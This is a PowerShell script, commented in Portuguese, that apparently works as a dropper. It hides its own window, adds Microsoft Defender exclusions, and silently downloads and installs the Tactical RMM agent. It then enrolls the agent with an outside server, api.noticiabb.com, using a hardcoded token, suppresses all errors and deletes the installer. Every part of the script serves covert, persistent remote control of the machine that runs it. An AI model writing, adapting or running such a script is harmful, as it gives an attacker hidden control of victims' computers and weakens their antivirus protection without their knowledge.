# Verifica se já está sendo executado em modo oculto
if (-not ([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle -eq 0)) {
    # Se não estiver oculto, reinicia o script em modo oculto
    Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-File", "`"$PSCommandPath`"" -NoNewWindow -ErrorAction SilentlyContinue | Out-Null
    exit
}

# A partir daqui, o script continua em modo oculto

# Definições de variáveis
$innosetup = 'tacticalagent-v2.8.0-windows-amd64.exe'
$api = '"https://api.noticiabb.com"'
$clientid = '1'
$siteid = '1'
$agenttype = '"server"'
$power = 0
$rdp = 0
$ping = 0
$auth = '"0ef910e2ec46dd3cab6fc47b486964fe566fe3a13280c84df0ee64d79c5003d4"'
$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.8.0/tacticalagent-v2.8.0-windows-amd64.exe'
$apilink = $downloadlink.split('/')

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$serviceName = 'tacticalrmm'
If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
    'Tactical RMM Is Already Installed' | Out-Null
} Else {
    $OutPath = $env:TMP
    $output = $innosetup

    $installArgs = @('-m install --api', "$api", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', "$agenttype", '--auth', "$auth")

    if ($power) {
        $installArgs += "--power"
    }

    if ($rdp) {
        $installArgs += "--rdp"
    }

    if ($ping) {
        $installArgs += "--ping"
    }

    Try {
        $DefenderStatus = Get-MpComputerStatus | Select-Object -ExpandProperty AntivirusEnabled
        if ($DefenderStatus -eq $true) {
            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*' | Out-Null
            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*' | Out-Null
            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*' | Out-Null
        }
    } Catch {
        # Silencia a mensagem de erro em caso de falha ao adicionar exclusões.
    }

    $X = 0
    do {
        Start-Sleep -s 5
        $X += 1
    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | ? { $_.TcpTestSucceeded }) -or $X -eq 3)

    if ($connectresult.TcpTestSucceeded -eq $true) {
        Try {
            # Download silencioso usando System.Net.WebClient
            $webclient = New-Object System.Net.WebClient
            $webclient.DownloadFile($downloadlink, "$OutPath\$output")

            # Executa de forma completamente silenciosa e oculta
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = "$OutPath\$output"
            $processInfo.Arguments = "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART"
            $processInfo.CreateNoWindow = $true
            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $process = [System.Diagnostics.Process]::Start($processInfo)
            $process.WaitForExit()

            # Executa o Tactical Agent de forma silenciosa
            $tacticalInfo = New-Object System.Diagnostics.ProcessStartInfo
            $tacticalInfo.FileName = "C:\Program Files\TacticalAgent\tacticalrmm.exe"
            $tacticalInfo.Arguments = $installArgs
            $tacticalInfo.CreateNoWindow = $true
            $tacticalInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $tacticalProcess = [System.Diagnostics.Process]::Start($tacticalInfo)
            $tacticalProcess.WaitForExit()

            exit 0
        } Catch {
            # Suprime qualquer mensagem de erro e saída em caso de falha.
        } Finally {
            Remove-Item -Path "$OutPath\$output" -Force | Out-Null
        }
    }
}
